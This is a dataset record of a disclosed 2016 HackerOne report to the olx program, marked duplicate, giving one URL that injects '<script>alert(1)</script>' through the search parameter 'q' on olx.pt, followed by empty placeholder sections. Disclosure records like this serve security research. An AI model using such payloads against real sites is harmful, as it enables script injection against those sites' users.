---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '150588'
original_report_id: '150588'
title: cross-site scripting in get request
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-07-12T17:00:59.861Z'
disclosed_at: '2017-04-07T14:26:28.003Z'
has_bounty: false
visibility: full
substate: duplicate
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# cross-site scripting in get request

## Metadata

- HackerOne Report ID: 150588
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2017-04-07T14:26:28.003Z
- Has Bounty: No
- Visibility: full
- Substate: duplicate

## Original Report

https://olx.pt/ads/?q=?><script>alert(1)</script> 

where "q" is the vulnerable parameter which triggers cross-site scripting

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
